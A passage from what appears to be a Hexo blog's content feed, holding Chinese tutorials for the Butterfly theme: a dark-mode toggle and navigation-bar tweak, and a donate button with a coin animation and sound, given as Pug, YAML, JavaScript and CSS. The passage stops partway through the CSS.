class="line"></span><br><span class="line">  <span class="comment">#weather</span></span><br><span class="line">  <span class="string">&lt;div</span> <span class="string">id=&quot;tp-weather-widget&quot;&gt;&lt;/div&gt;</span> </span><br><span class="line">  <span class="comment">#menus</span></span><br><span class="line">    <span class="string">if</span> <span class="string">(theme.algolia_search.enable</span> <span class="string">||</span> <span class="string">theme.local_search.enable)</span></span><br><span class="line">      <span class="string">div.nav-button#search-button</span></span><br><span class="line">        <span class="string">a.site-page.social-icon.search</span></span><br><span class="line">          <span class="string">i.fas.fa-search.fa-fw</span></span><br><span class="line">          <span class="string">span=&#x27;</span> <span class="string">&#x27;+_p(&#x27;</span><span class="string">search.title&#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="string">if</span> <span class="string">darkmode.enable</span> <span class="string">&amp;&amp;</span> <span class="string">darkmode.button</span></span><br><span class="line">      <span class="string">div.nav-button#darkmode_navswitch</span></span><br><span class="line">        <span class="string">a.darkmode_switchbutton(type=&quot;button&quot;</span> <span class="string">title=_p(&#x27;rightside.night_mode_title&#x27;)</span> <span class="string">onclick=&quot;switchDarkMode()&quot;)</span></span><br><span class="line">          <span class="string">i.fas.fa-adjust</span></span><br><span class="line"></span><br><span class="line">    <span class="string">div.nav-button#nav-totop</span></span><br><span class="line">      <span class="string">a.totopbtn</span></span><br><span class="line">        <span class="string">i.fas.fa-arrow-up</span></span><br><span class="line">        <span class="string">span#percent(onclick=&quot;btf.scrollToDest(0,500)&quot;)</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">!=partial(&#x27;includes/header/menu_item&#x27;,</span> &#123;&#125;<span class="string">,</span> &#123;<span class="attr">cache:</span> <span class="literal">true</span>&#125;<span class="string">)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#toggle-menu</span></span><br><span class="line">      <span class="string">a.site-page</span></span><br><span class="line">        <span class="string">i.fas.fa-bars.fa-fw</span></span><br></pre></td></tr></table></figure><h3 id="6-打开主题配置文件-config-butterfly-xml"><a href="#6-打开主题配置文件-config-butterfly-xml" class="headerlink" title="6. 打开主题配置文件_config.butterfly.xml"></a>6. 打开主题配置文件<code>_config.butterfly.xml</code></h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">   - <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://src.ffing.cn/hexo/css/nav_menu.css&quot;</span>&gt;</span></span><br><span class="line">   - <span class="tag">&lt;<span class="name">script</span> <span class="attr">defer</span> <span class="attr">src</span>=<span class="string">&quot;https://src.ffing.cn/hexo/js/switchDarkMode.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>      </span><br><span class="line">   - <span class="tag">&lt;<span class="name">script</span> <span class="attr">defer</span> <span class="attr">src</span>=<span class="string">&quot;/js/nav_menu.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure><h3 id="7-重写昼夜转换按钮"><a href="#7-重写昼夜转换按钮" class="headerlink" title="7. 重写昼夜转换按钮"></a>7. 重写昼夜转换按钮</h3><p>新建<code>Blog根目录/source/js/switchDarkMode.js</code>，写入下列代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*白天黑夜切换*/</span></span><br><span class="line"><span class="comment">//切换夜间</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">switchDarkMode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> nowMode = <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="title function_">getAttribute</span>(<span class="string">&#x27;data-theme&#x27;</span>) === <span class="string">&#x27;dark&#x27;</span> ? <span class="string">&#x27;dark&#x27;</span> : <span class="string">&#x27;light&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> (nowMode === <span class="string">&#x27;light&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_">activateDarkMode</span>()</span><br><span class="line">        saveToLocal.<span class="title function_">set</span>(<span class="string">&#x27;theme&#x27;</span>, <span class="string">&#x27;dark&#x27;</span>, <span class="number">2</span>)</span><br><span class="line">        <span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">Snackbar</span> !== <span class="literal">undefined</span> &amp;&amp; btf.<span class="title function_">snackbarShow</span>(<span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">Snackbar</span>.<span class="property">day_to_night</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">activateLightMode</span>()</span><br><span class="line">        saveToLocal.<span class="title function_">set</span>(<span class="string">&#x27;theme&#x27;</span>, <span class="string">&#x27;light&#x27;</span>, <span class="number">2</span>)</span><br><span class="line">        <span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">Snackbar</span> !== <span class="literal">undefined</span> &amp;&amp; btf.<span class="title function_">snackbarShow</span>(<span class="variable constant_">GLOBAL_CONFIG</span>.<span class="property">Snackbar</span>.<span class="property">night_to_day</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// handle some cases</span></span><br><span class="line">    <span class="keyword">typeof</span> utterancesTheme === <span class="string">&#x27;function&#x27;</span> &amp;&amp; <span class="title function_">utterancesTheme</span>()</span><br><span class="line">    <span class="keyword">typeof</span> changeGiscusTheme === <span class="string">&#x27;function&#x27;</span> &amp;&amp; <span class="title function_">changeGiscusTheme</span>()</span><br><span class="line">    <span class="keyword">typeof</span> <span class="variable constant_">FB</span> === <span class="string">&#x27;object&#x27;</span> &amp;&amp; <span class="variable language_">window</span>.<span class="title function_">loadFBComment</span>()</span><br><span class="line">    <span class="keyword">typeof</span> runMermaid === <span class="string">&#x27;function&#x27;</span> &amp;&amp; <span class="variable language_">window</span>.<span class="title function_">runMermaid</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-引入js"><a href="#8-引入js" class="headerlink" title="8. 引入js"></a>8. 引入js</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">    - <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/js/switchDarkMode.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="9-hexo三连"><a href="#9-hexo三连" class="headerlink" title="9. hexo三连"></a>9. hexo三连</h3>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>打赏功能添加银币图标和音效</title>
      <link href="/post/1138de43.html"/>
      <url>/post/1138de43.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转载自：<a href="https://anzhiy.cn/posts/sdxhu.html">安知鱼butterfly重装日记</a></p><details class="folding-tag" ><summary> 效果预览 </summary>              <div class='content'>              <p><img src="https://s1.ax1x.com/2023/05/22/p9IsECD.png" alt=""></p>              </div>            </details><p><code>ps</code>：打赏会有投币特效和┗|｀O′|┛ 嗷~~的一声~</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="1-修改-Blogroot-themes-butterfly-languages-zh-CN-yml"><a href="#1-修改-Blogroot-themes-butterfly-languages-zh-CN-yml" class="headerlink" title="1. 修改[Blogroot]\themes\butterfly\languages\zh-CN.yml"></a>1. 修改<code>[Blogroot]\themes\butterfly\languages\zh-CN.yml</code></h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">date_suffix:</span></span><br><span class="line">  <span class="attr">just:</span> <span class="string">刚刚</span></span><br><span class="line">  <span class="attr">min:</span> <span class="string">分钟前</span></span><br><span class="line">  <span class="attr">hour:</span> <span class="string">小时前</span></span><br><span class="line">  <span class="attr">day:</span> <span class="string">天前</span></span><br><span class="line">  <span class="attr">month:</span> <span class="string">个月前</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">donate:</span> <span class="string">打赏</span></span><br><span class="line"><span class="string">+</span> <span class="attr">donate:</span> <span class="string">不给糖果就捣蛋</span></span><br><span class="line"><span class="attr">share:</span> <span class="string">分享</span></span><br></pre></td></tr></table></figure><h3 id="2-修改-Blogroot-themes-butterfly-layout-includes-post-reward-pug-整体替换为以下内容"><a href="#2-修改-Blogroot-themes-butterfly-layout-includes-post-reward-pug-整体替换为以下内容" class="headerlink" title="2. 修改[Blogroot]\themes\butterfly\layout\includes\post\reward.pug,整体替换为以下内容"></a>2. 修改<code>[Blogroot]\themes\butterfly\layout\includes\post\reward.pug</code>,整体替换为以下内容</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">link(rel=&#x27;stylesheet&#x27;</span> <span class="string">href=url_for(theme.CDN.option.coin_css)</span> <span class="string">media=&quot;defer&quot;</span> <span class="string">onload=&quot;this.media=&#x27;all&#x27;&quot;)</span></span><br><span class="line"><span class="string">.post-reward</span></span><br><span class="line">  <span class="string">button.tip-button.reward-button</span></span><br><span class="line">    <span class="string">span.tip-button__text=</span> <span class="string">_p(&#x27;donate&#x27;)</span></span><br><span class="line">    <span class="string">.coin-wrapper</span></span><br><span class="line">      <span class="string">.coin</span></span><br><span class="line">        <span class="string">.coin__middle</span></span><br><span class="line">        <span class="string">.coin__back</span></span><br><span class="line">        <span class="string">.coin__front</span></span><br><span class="line">    <span class="string">.reward-main</span></span><br><span class="line">      <span class="string">ul.reward-all</span></span><br><span class="line">        <span class="string">each</span> <span class="string">item</span> <span class="string">in</span> <span class="string">theme.reward.QR_code</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">var</span> <span class="string">clickTo</span> <span class="string">=</span> <span class="string">(item.itemlist||item).link</span> <span class="string">?</span> <span class="string">(item.itemlist||item).link</span> <span class="string">:</span> <span class="string">(item.itemlist||item).img</span></span><br><span class="line">          <span class="string">li.reward-item</span></span><br><span class="line">            <span class="string">a(href=clickTo</span> <span class="string">target=&#x27;_blank&#x27;)</span></span><br><span class="line">              <span class="string">img.post-qr-code-img(src=url_for((item.itemlist||item).img)</span> <span class="string">alt=(item.itemlist||item).text)</span></span><br><span class="line">            <span class="string">.post-qr-code-desc=(item.itemlist||item).text</span></span><br><span class="line"><span class="string">if</span> <span class="string">theme.reward.coinAudio</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">var</span> <span class="string">coinAudio</span> <span class="string">=</span> <span class="string">theme.reward.coinAudio</span> <span class="string">?</span> <span class="string">url_for(theme.reward.coinAudio)</span> <span class="string">:</span> <span class="string">&#x27;https://cdn.cbd.int/akilar-candyassets@1.0.36/audio/coin.mp3&#x27;</span></span><br><span class="line">  <span class="string">audio#coinAudio(src=coinAudio)</span></span><br><span class="line"><span class="string">script(defer</span> <span class="string">src=url_for(theme.CDN.option.coin_js))</span></span><br></pre></td></tr></table></figure><h3 id="3-新建-Blogroot-source-css-coin-coin-css"><a href="#3-新建-Blogroot-source-css-coin-coin-css" class="headerlink" title="3. 新建[Blogroot]source\css\coin\coin.css"></a>3. 新建<code>[Blogroot]source\css\coin\coin.css</code></h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.tip-button</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">0.25rem</span>;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">font-weight</span>: <span class="number">600</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">2.6rem</span>;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: -<span class="number">4rem</span>;</span><br><span class="line">  <span class="attribute">outline</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">transform-origin</span>: <span class="number">0%</span> <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">transition</span>: transform <span class="number">50ms</span> ease-in-out;</span><br><span class="line">  <span class="attribute">width</span>: auto;</span><br><span class="line">  -webkit-tap-highlight-<span class="attribute">color</span>: transparent;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.tip-button</span><span class="selector-pseudo">:active</span> &#123;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">4deg</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.tip-button</span><span class="selector-class">.clicked</span> &#123;</span><br><span class="line">  <span class="attribute">animation</span>: <span class="number">150ms</span> ease-in-out <span class="number">1</span> shake;</span><br><span class="line">  <span class="attribute">pointer-events</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.tip-button</span><span class="selector-class">.clicked</span> <span class="selector-class">.tip-button__text</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">transition</span>: opacity <span class="number">100ms</span> linear <span class="number">200ms</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.tip-button</span><span class="selector-class">.clicked</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">0.5rem</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">60%</span>;</span><br><span class="line">  <span class="attribute">background</span>: $button-hover-color;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.tip-button</span><span class="selector-class">.clicked</span> <span class="selector-class">.coin</span> &#123;</span><br><span class="line">  <span class="attribute">transition</span>: margin-bottom <span class="number">1s</span> linear <span class="number">200ms</span>;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.tip-button</span><span class="selector-class">.shrink-landing</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">transition</span>: width <span class="number">200ms</span> ease-in;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.tip-button</span><span class="selector-class">.coin-landed</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="attribute">transform-origin</span>: <span class="number">50%</span> <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.tip-button</span><span class="selector-class">.coin-landed</span> <span class="selector-class">.coin-wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">radial-gradient</span>(circle at <span class="number">35%</span> <span class="number">97%</span>, <span class="built_in">rgba</span>(<span class="number">3</span>, <span class="number">16</span>, <span class="number">50</span>, <span class="number">0.4</span>) <span class="number">0.04rem</span>, transparent <span class="number">0.04rem</span>), <span class="built_in">radial-gradient</span>(</span><br><span class="line">      circle at <span class="number">45%</span> <span class="number">92%</span>,</span><br><span class="line">      <span class="built_in">rgba</span>(<span class="number">3</span>, <span class="number">16</span>, <span class="number">50</span>, <span class="number">0.4</span>) <span class="number">0.04rem</span>,</span><br><span class="line">      transparent <span class="number">0.02rem</span></span><br><span class="line">    ), <span class="built_in">radial-gradient</span>(circle at <span class="number">55%</span> <span class="number">98%</span>, <span class="built_in">rgba</span>(<span class="number">3</span>, <span class="number">16</span>, <span class="number">50</span>, <span class="number">0.4</span>) <span class="number">0.04rem</span>, transparent <span class="number">0.04rem</span>), <span class="built_in">radial-gradient</span>(circle at</span><br><span class="line">        <span class="number">65%</span> <span class="number">96%</span>, <span class="built_in">rgba</span>(<span class="number">3</span>, <span class="number">16</span>, <span class="number">50</span>, <span class="number">0.4</span>) <span class="number">0.06rem</span>, transparent <span class="number">0.06rem</span>);</span><br><span class="line">  <span class="attribute">background-position</span>: center bottom;</span><br><span class="line">  <span class="attribute">background-size</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: -<span class="number">1rem</span>;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">2</span>) <span class="built_in">translateY</span>(-<span class="number">10px</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.tip-button__text</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">  <span class="attribute">margin-right</span>: <span class="number">1.8rem</span>;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">transition</span>: opacity <span class="number">100ms</span> linear <span class="number">500ms</span>;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.tip-button</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">0.25rem</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateX</span>(-<span class="number">50%</span>);</span><br><span class="line">  <span class="attribute">transition</span>: height <span class="number">250ms</span> ease-in-out <span class="number">400ms</span>, width <span class="number">250ms</span> ease-in-out <span class="number">300ms</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.tip-button</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">bottom</span>: -<span class="number">1rem</span>;</span><br><span class="line">  <span class="attribute">color</span>: white;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;ヾ(≧O≦)〃嗷~&quot;</span>; <span class="comment">/*点击后显示的内容*/</span></span><br><span class="line">  <span class="attribute">height</span>: <span class="number">110%</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">pointer-events</span>: none;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="attribute">transform-origin</span>: <span class="number">50%</span> <span class="number">20%</span>;</span><br><span class="line">  <span class="attribute">transition</span>: transform <span class="number">200ms</span> <span class="built_in">cubic-bezier</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.35</span>, <span class="number">1.43</span>);</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.coin-wrapper</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: none;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">18rem</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  <span class="attribute">pointer-events</span>: none;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">transform</span>: none;</span><br><span class="line">  <span class="attribute">transform-origin</span>: <span class="number">50%</span> <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">transition</span>: opacity <span class="number">200ms</span> linear <span class="number">100ms</span>, transform <span class="number">300ms</span> ease-out;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.coin</span> &#123;</span><br><span class="line">  <span class="attr">--front-y-multiplier</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attr">--back-y-multiplier</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attr">--coin-y-multiplier</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attr">--coin-x-multiplier</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attr">--coin-scale-multiplier</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attr">--coin-rotation-multiplier</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attr">--shine-opacity-multiplier</span>: <span class="number">0.4</span>;</span><br><span class="line">  <span class="attr">--shine-bg-multiplier</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="built_in">calc</span>(<span class="built_in">var</span>(--coin-y-multiplier) * <span class="number">1rem</span> - <span class="number">3.5rem</span>);</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">3.5rem</span>;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">3.05rem</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">right</span>: <span class="built_in">calc</span>(<span class="built_in">var</span>(--coin-x-multiplier) * <span class="number">34%</span> + <span class="number">16%</span>);</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateX</span>(<span class="number">50%</span>) <span class="built_in">scale</span>(<span class="built_in">calc</span>(<span class="number">0.4</span> + <span class="built_in">var</span>(--coin-scale-multiplier))) <span class="built_in">rotate</span>(<span class="built_in">calc</span>(<span class="built_in">var</span>(</span><br><span class="line">            --coin-rotation-multiplier</span><br><span class="line">          ) * -<span class="number">1deg</span>));</span><br><span class="line">  <span class="attribute">transition</span>: opacity <span class="number">100ms</span> linear <span class="number">200ms</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">3.5rem</span>;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.coin__front</span>,</span><br><span class="line"><span class="selector-class">.coin__middle</span>,</span><br><span class="line"><span class="selector-class">.coin__back</span>,</span><br><span class="line"><span class="selector-class">.coin</span><span class="selector-pseudo">::before</span>,</span><br><span class="line"><span class="selector-class">.coin__front</span><span class="selector-pseudo">::after</span>,</span><br><span class="line"><span class="selector-class">.coin__back</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span 